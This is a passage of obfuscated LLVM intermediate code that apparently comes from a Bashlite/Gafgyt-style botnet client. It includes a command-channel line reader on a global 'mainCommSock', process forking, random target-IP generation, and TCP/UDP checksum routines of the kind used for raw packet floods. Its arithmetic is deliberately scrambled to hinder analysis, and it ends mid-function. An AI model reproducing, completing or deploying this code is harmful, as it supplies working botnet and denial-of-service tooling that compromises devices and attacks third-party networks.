  %87 = or i64 %77, %78
  %88 = xor i64 %87, -1
  %89 = or i64 5269864036901865016, %79
  %90 = and i64 %88, %89
  %91 = or i64 %86, %90
  %92 = or i64 %76, %70
  store i64 %91, i64* %75, align 8
  %93 = load i32, i32* %6, align 4
  %94 = sub i32 %93, 1678410440
  %95 = add i32 %94, 1
  %96 = add i32 %95, 1678410440
  %97 = add nsw i32 %93, 1
  %98 = call i32 @select(i32 %96, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %99 = icmp sgt i32 %98, 0
  br i1 %99, label %100, label %108

; <label>:100:                                    ; preds = %66
  store i32 4, i32* %13, align 4
  %101 = load i32, i32* %6, align 4
  %102 = bitcast i32* %14 to i8*
  %103 = call i32 @getsockopt(i32 %101, i32 1, i32 4, i8* %102, i32* %13) #2
  %104 = load i32, i32* %14, align 4
  %105 = icmp ne i32 %104, 0
  br i1 %105, label %106, label %107

; <label>:106:                                    ; preds = %100
  store i32 0, i32* %5, align 4
  br label %124

; <label>:107:                                    ; preds = %100
  br label %109

; <label>:108:                                    ; preds = %66
  store i32 0, i32* %5, align 4
  br label %124

; <label>:109:                                    ; preds = %107
  br label %111

; <label>:110:                                    ; preds = %48
  store i32 0, i32* %5, align 4
  br label %124

; <label>:111:                                    ; preds = %109
  br label %112

; <label>:112:                                    ; preds = %111, %40
  %113 = load i32, i32* %6, align 4
  %114 = call i32 (i32, i32, ...) @fcntl(i32 %113, i32 3, i8* null)
  %115 = sext i32 %114 to i64
  store i64 %115, i64* %15, align 8
  %116 = load i64, i64* %15, align 8
  %117 = xor i64 -2049, -1
  %118 = xor i64 %116, %117
  %119 = and i64 %118, %116
  %120 = and i64 %116, -2049
  store i64 %119, i64* %15, align 8
  %121 = load i32, i32* %6, align 4
  %122 = load i64, i64* %15, align 8
  %123 = call i32 (i32, i32, ...) @fcntl(i32 %121, i32 4, i64 %122)
  store i32 1, i32* %5, align 4
  br label %124

; <label>:124:                                    ; preds = %112, %110, %108, %106, %39
  %125 = load i32, i32* %5, align 4
  ret i32 %125
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %39

; <label>:14:                                     ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = xor i64 %16, -1
  %24 = xor i64 %22, -1
  %25 = xor i64 921042780275199200, -1
  %26 = and i64 %23, 921042780275199200
  %27 = and i64 %16, %25
  %28 = and i64 %24, 921042780275199200
  %29 = and i64 %22, %25
  %30 = or i64 %26, %27
  %31 = or i64 %28, %29
  %32 = xor i64 %30, %31
  %33 = or i64 %23, %24
  %34 = xor i64 %33, -1
  %35 = or i64 921042780275199200, %25
  %36 = and i64 %34, %35
  %37 = or i64 %32, %36
  %38 = or i64 %16, %22
  store i64 %37, i64* %3, align 8
  br label %4

; <label>:39:                                     ; preds = %12
  %40 = load i64, i64* %3, align 8
  ret i64 %40
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %79 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %52
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %116

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %38

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %36

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  %31 = and i1 true, %30
  %32 = xor i1 true, true
  %33 = and i1 %29, %32
  %34 = or i1 %31, %33
  %35 = xor i1 %29, true
  br label %36

; <label>:36:                                     ; preds = %24, %19
  %37 = phi i1 [ false, %19 ], [ %34, %24 ]
  br label %38

; <label>:38:                                     ; preds = %36, %13
  %39 = phi i1 [ true, %13 ], [ %37, %36 ]
  %40 = xor i1 %39, true
  %41 = and i1 false, %40
  %42 = xor i1 false, true
  %43 = and i1 %39, %42
  %44 = xor i1 true, true
  %45 = and i1 %44, false
  %46 = and i1 true, %42
  %47 = or i1 %41, %43
  %48 = or i1 %45, %46
  %49 = xor i1 %47, %48
  %50 = xor i1 %39, true
  %51 = zext i1 %49 to i32
  store i32 %51, i32* %3, align 4
  br label %116

; <label>:52:                                     ; preds = %2
  %53 = load i8*, i8** %5, align 8
  %54 = load i8, i8* %53, align 1
  %55 = zext i8 %54 to i32
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %70

; <label>:57:                                     ; preds = %52
  %58 = load i8*, i8** %4, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 1
  %60 = load i8*, i8** %5, align 8
  %61 = getelementptr inbounds i8, i8* %60, i64 1
  %62 = call i32 @wildString(i8* %59, i8* %61)
  %63 = icmp ne i32 %62, 0
  %64 = xor i1 %63, true
  %65 = and i1 true, %64
  %66 = xor i1 true, true
  %67 = and i1 %63, %66
  %68 = or i1 %65, %67
  %69 = xor i1 %63, true
  br label %70

; <label>:70:                                     ; preds = %57, %52
  %71 = phi i1 [ false, %52 ], [ %68, %57 ]
  %72 = xor i1 %71, true
  %73 = and i1 true, %72
  %74 = xor i1 true, true
  %75 = and i1 %71, %74
  %76 = or i1 %73, %75
  %77 = xor i1 %71, true
  %78 = zext i1 %76 to i32
  store i32 %78, i32* %3, align 4
  br label %116

; <label>:79:                                     ; preds = %2
  %80 = load i8*, i8** %4, align 8
  %81 = load i8, i8* %80, align 1
  %82 = zext i8 %81 to i32
  %83 = call i32 @toupper(i32 %82) #10
  %84 = load i8*, i8** %5, align 8
  %85 = load i8, i8* %84, align 1
  %86 = zext i8 %85 to i32
  %87 = call i32 @toupper(i32 %86) #10
  %88 = icmp eq i32 %83, %87
  br i1 %88, label %89, label %102

; <label>:89:                                     ; preds = %79
  %90 = load i8*, i8** %4, align 8
  %91 = getelementptr inbounds i8, i8* %90, i64 1
  %92 = load i8*, i8** %5, align 8
  %93 = getelementptr inbounds i8, i8* %92, i64 1
  %94 = call i32 @wildString(i8* %91, i8* %93)
  %95 = icmp ne i32 %94, 0
  %96 = xor i1 %95, true
  %97 = and i1 true, %96
  %98 = xor i1 true, true
  %99 = and i1 %95, %98
  %100 = or i1 %97, %99
  %101 = xor i1 %95, true
  br label %102

; <label>:102:                                    ; preds = %89, %79
  %103 = phi i1 [ false, %79 ], [ %100, %89 ]
  %104 = xor i1 %103, true
  %105 = and i1 true, %104
  %106 = xor i1 true, true
  %107 = and i1 %103, %106
  %108 = xor i1 true, true
  %109 = and i1 %108, true
  %110 = and i1 true, %106
  %111 = or i1 %105, %107
  %112 = or i1 %109, %110
  %113 = xor i1 %111, %112
  %114 = xor i1 %103, true
  %115 = zext i1 %113 to i32
  store i32 %115, i32* %3, align 4
  br label %116

; <label>:116:                                    ; preds = %102, %70, %38, %9
  %117 = load i32, i32* %3, align 4
  ret i32 %117
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

; <label>:7:                                      ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #10
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3

; <label>:16:                                     ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @RandString(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %21, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %26

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = sub i32 0, 65
  %14 = sub i32 %12, %13
  %15 = add i32 %12, 65
  %16 = trunc i32 %14 to i8
  %17 = load i8*, i8** %3, align 8
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  store i8 %16, i8* %20, align 1
  br label %21

; <label>:21:                                     ; preds = %10
  %22 = load i32, i32* %5, align 4
  %23 = sub i32 0, 1
  %24 = sub i32 %22, %23
  %25 = add nsw i32 %22, 1
  store i32 %24, i32* %5, align 4
  br label %6

; <label>:26:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !2
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = and i64 %43, %37
  %45 = xor i64 %43, %37
  %46 = or i64 %44, %45
  %47 = or i64 %43, %37
  store i64 %46, i64* %42, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sub i32 0, %48
  %50 = sub i32 0, 1
  %51 = add i32 %49, %50
  %52 = sub i32 0, %51
  %53 = add nsw i32 %48, 1
  %54 = call i32 @select(i32 %52, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %54, i32* %12, align 4
  %55 = icmp sle i32 %54, 0
  br i1 %55, label %56, label %104

; <label>:56:                                     ; preds = %33
  br label %57

; <label>:57:                                     ; preds = %96, %56
  %58 = load i32, i32* %13, align 4
  %59 = icmp slt i32 %58, 10
  br i1 %59, label %60, label %103

; <label>:60:                                     ; preds = %57
  %61 = load i32, i32* @mainCommSock, align 4
  %62 = call i32 (i32, i8*, ...) @sockprintf(i32 %61, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i32 0, i32 0))
  %63 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %63, align 8
  %64 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %64, align 8
  br label %65

; <label>:65:                                     ; preds = %60
  %66 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %67 = getelementptr inbounds [16 x i64], [16 x i64]* %66, i64 0, i64 0
  %68 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %67) #2, !srcloc !3
  %69 = extractvalue { i64, i64* } %68, 0
  %70 = extractvalue { i64, i64* } %68, 1
  %71 = trunc i64 %69 to i32
  store i32 %71, i32* %14, align 4
  %72 = ptrtoint i64* %70 to i64
  %73 = trunc i64 %72 to i32
  store i32 %73, i32* %15, align 4
  br label %74

; <label>:74:                                     ; preds = %65
  %75 = load i32, i32* %5, align 4
  %76 = srem i32 %75, 64
  %77 = zext i32 %76 to i64
  %78 = shl i64 1, %77
  %79 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %80 = load i32, i32* %5, align 4
  %81 = sdiv i32 %80, 64
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds [16 x i64], [16 x i64]* %79, i64 0, i64 %82
  %84 = load i64, i64* %83, align 8
  %85 = and i64 %84, %78
  %86 = xor i64 %84, %78
  %87 = or i64 %85, %86
  %88 = or i64 %84, %78
  store i64 %87, i64* %83, align 8
  %89 = load i32, i32* %5, align 4
  %90 = add i32 %89, 1217898212
  %91 = add i32 %90, 1
  %92 = sub i32 %91, 1217898212
  %93 = add nsw i32 %89, 1
  %94 = call i32 @select(i32 %92, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %94, i32* %12, align 4
  %95 = icmp sle i32 %94, 0
  br i1 %95, label %96, label %102

; <label>:96:                                     ; preds = %74
  %97 = load i32, i32* %13, align 4
  %98 = add i32 %97, 1118230690
  %99 = add i32 %98, 1
  %100 = sub i32 %99, 1118230690
  %101 = add nsw i32 %97, 1
  store i32 %100, i32* %13, align 4
  br label %57

; <label>:102:                                    ; preds = %74
  br label %103

; <label>:103:                                    ; preds = %102, %57
  br label %104

; <label>:104:                                    ; preds = %103, %33
  store i32 0, i32* %18, align 4
  %105 = load i8*, i8** %6, align 8
  store i8* %105, i8** %17, align 8
  br label %106

; <label>:106:                                    ; preds = %127, %104
  %107 = load i32, i32* %7, align 4
  %108 = add i32 %107, -1959373381
  %109 = add i32 %108, -1
  %110 = sub i32 %109, -1959373381
  %111 = add nsw i32 %107, -1
  store i32 %110, i32* %7, align 4
  %112 = icmp sgt i32 %107, 1
  br i1 %112, label %113, label %133

; <label>:113:                                    ; preds = %106
  %114 = load i32, i32* @mainCommSock, align 4
  %115 = call i64 @recv(i32 %114, i8* %16, i64 1, i32 0)
  %116 = icmp ne i64 %115, 1
  br i1 %116, label %117, label %119

; <label>:117:                                    ; preds = %113
  %118 = load i8*, i8** %17, align 8
  store i8 0, i8* %118, align 1
  store i32 -1, i32* %4, align 4
  br label %136

; <label>:119:                                    ; preds = %113
  %120 = load i8, i8* %16, align 1
  %121 = load i8*, i8** %17, align 8
  %122 = getelementptr inbounds i8, i8* %121, i32 1
  store i8* %122, i8** %17, align 8
  store i8 %120, i8* %121, align 1
  %123 = load i8, i8* %16, align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 10
  br i1 %125, label %126, label %127

; <label>:126:                                    ; preds = %119
  br label %133

; <label>:127:                                    ; preds = %119
  %128 = load i32, i32* %18, align 4
  %129 = sub i32 %128, -2083675618
  %130 = add i32 %129, 1
  %131 = add i32 %130, -2083675618
  %132 = add nsw i32 %128, 1
  store i32 %131, i32* %18, align 4
  br label %106

; <label>:133:                                    ; preds = %126, %106
  %134 = load i8*, i8** %17, align 8
  store i8 0, i8* %134, align 1
  %135 = load i32, i32* %18, align 4
  store i32 %135, i32* %4, align 4
  br label %136

; <label>:136:                                    ; preds = %133, %117
  %137 = load i32, i32* %4, align 4
  ret i32 %137
}

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %62

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = sub i64 %11, -5101983732733168761
  %13 = add i64 %12, 1
  %14 = add i64 %13, -5101983732733168761
  %15 = add i64 %11, 1
  store i64 %14, i64* @numpids, align 8
  %16 = load i64, i64* @numpids, align 8
  %17 = sub i64 0, %16
  %18 = sub i64 0, 1
  %19 = add i64 %17, %18
  %20 = sub i64 0, %19
  %21 = add i64 %16, 1
  %22 = mul i64 %20, 4
  %23 = call noalias i8* @malloc(i64 %22) #2
  %24 = bitcast i8* %23 to i32*
  store i32* %24, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %25

; <label>:25:                                     ; preds = %43, %10
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = load i64, i64* @numpids, align 8
  %29 = sub i64 0, 1
  %30 = add i64 %28, %29
  %31 = sub i64 %28, 1
  %32 = icmp ult i64 %27, %30
  br i1 %32, label %33, label %49

; <label>:33:                                     ; preds = %25
  %34 = load i32*, i32** @pids, align 8
  %35 = load i32, i32* %4, align 4
  %36 = zext i32 %35 to i64
  %37 = getelementptr inbounds i32, i32* %34, i64 %36
  %38 = load i32, i32* %37, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i32, i32* %4, align 4
  %41 = zext i32 %40 to i64
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  br label %43

; <label>:43:                                     ; preds = %33
  %44 = load i32, i32* %4, align 4
  %45 = sub i32 %44, 273012968
  %46 = add i32 %45, 1
  %47 = add i32 %46, 273012968
  %48 = add i32 %44, 1
  store i32 %47, i32* %4, align 4
  br label %25

; <label>:49:                                     ; preds = %25
  %50 = load i32, i32* %2, align 4
  %51 = load i32*, i32** %3, align 8
  %52 = load i64, i64* @numpids, align 8
  %53 = sub i64 %52, 5109335845602299728
  %54 = sub i64 %53, 1
  %55 = add i64 %54, 5109335845602299728
  %56 = sub i64 %52, 1
  %57 = getelementptr inbounds i32, i32* %51, i64 %55
  store i32 %50, i32* %57, align 4
  %58 = load i32*, i32** @pids, align 8
  %59 = bitcast i32* %58 to i8*
  call void @free(i8* %59) #2
  %60 = load i32*, i32** %3, align 8
  store i32* %60, i32** @pids, align 8
  %61 = load i32, i32* %2, align 4
  store i32 %61, i32* %1, align 4
  br label %62

; <label>:62:                                     ; preds = %49, %8
  %63 = load i32, i32* %1, align 4
  ret i32 %63
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = xor i32 %5, -1
  %8 = xor i32 %6, -1
  %9 = xor i32 -824757899, -1
  %10 = or i32 %7, %8
  %11 = or i32 -824757899, %9
  %12 = xor i32 %10, -1
  %13 = and i32 %12, %11
  %14 = and i32 %5, %6
  store i32 %13, i32* %3, align 4
  %15 = load i32, i32* %3, align 4
  %16 = call i32 @rand_cmwc()
  %17 = load i32, i32* %2, align 4
  %18 = xor i32 %17, -1
  %19 = and i32 -1, %18
  %20 = xor i32 -1, -1
  %21 = and i32 %17, %20
  %22 = or i32 %19, %21
  %23 = xor i32 %17, -1
  %24 = xor i32 %16, -1
  %25 = xor i32 %22, -1
  %26 = xor i32 456149144, -1
  %27 = or i32 %24, %25
  %28 = or i32 456149144, %26
  %29 = xor i32 %27, -1
  %30 = and i32 %29, %28
  %31 = and i32 %16, %22
  %32 = xor i32 %15, -1
  %33 = and i32 316445245, %32
  %34 = xor i32 316445245, -1
  %35 = and i32 %15, %34
  %36 = xor i32 %30, -1
  %37 = and i32 %36, 316445245
  %38 = and i32 %30, %34
  %39 = or i32 %33, %35
  %40 = or i32 %37, %38
  %41 = xor i32 %39, %40
  %42 = xor i32 %15, %30
  ret i32 %41
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %24

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = sub i64 %14, -2877155502630080669
  %16 = add i64 %15, %13
  %17 = add i64 %16, -2877155502630080669
  %18 = add i64 %14, %13
  store i64 %17, i64* %5, align 8
  %19 = load i32, i32* %4, align 4
  %20 = add i32 %19, 1024169278
  %21 = sub i32 %20, 2
  %22 = sub i32 %21, 1024169278
  %23 = sub nsw i32 %19, 2
  store i32 %22, i32* %4, align 4
  br label %6

; <label>:24:                                     ; preds = %6
  %25 = load i32, i32* %4, align 4
  %26 = icmp sgt i32 %25, 0
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %24
  %28 = load i16*, i16** %3, align 8
  %29 = bitcast i16* %28 to i8*
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i64
  %32 = load i64, i64* %5, align 8
  %33 = sub i64 0, %31
  %34 = sub i64 %32, %33
  %35 = add i64 %32, %31
  store i64 %34, i64* %5, align 8
  br label %36

; <label>:36:                                     ; preds = %27, %24
  br label %37

; <label>:37:                                     ; preds = %41, %36
  %38 = load i64, i64* %5, align 8
  %39 = lshr i64 %38, 16
  %40 = icmp ne i64 %39, 0
  br i1 %40, label %41, label %54

; <label>:41:                                     ; preds = %37
  %42 = load i64, i64* %5, align 8
  %43 = xor i64 65535, -1
  %44 = xor i64 %42, %43
  %45 = and i64 %44, %42
  %46 = and i64 %42, 65535
  %47 = load i64, i64* %5, align 8
  %48 = lshr i64 %47, 16
  %49 = sub i64 0, %45
  %50 = sub i64 0, %48
  %51 = add i64 %49, %50
  %52 = sub i64 0, %51
  %53 = add i64 %45, %48
  store i64 %52, i64* %5, align 8
  br label %37

; <label>:54:                                     ; preds = %37
  %55 = load i64, i64* %5, align 8
  %56 = xor i64 %55, -1
  %57 = and i64 -1, %56
  %58 = xor i64 -1, -1
  %59 = and i64 %55, %58
  %60 = or i64 %57, %59
  %61 = xor i64 %55, -1
  %62 = trunc i64 %60 to i16
  ret i16 %62
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcp_udp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %43

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = sub i32 0, %30
  %32 = sub i32 0, %29
  %33 = add i32 %31, %32
  %34 = sub i32 0, %33
  %35 = add i32 %30, %29
  store i32 %34, i32* %12, align 4
  %36 = load i16*, i16** %9, align 8
  %37 = getelementptr inbounds i16, i16* %36, i32 1
  store i16* %37, i16** %9, align 8
  %38 = load i32, i32* %8, align 4
  %39 = sub i32 %38, 886090405
  %40 = sub i32 %39, 2
  %41 = add i32 %40, 886090405
  %42 = sub nsw i32 %38, 2
  store i32 %41, i32* %8, align 4
  br label %23

; <label>:43:                                     ; preds = %23
  %44 = load i32, i32* %8, align 4
  %45 = icmp eq i32 %44, 1
  br i1 %45, label %46, label %55

; <label>:46:                                     ; preds = %43
  %47 = load i16*, i16** %9, align 8
  %48 = bitcast i16* %47 to i8*
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = load i32, i32* %12, align 4
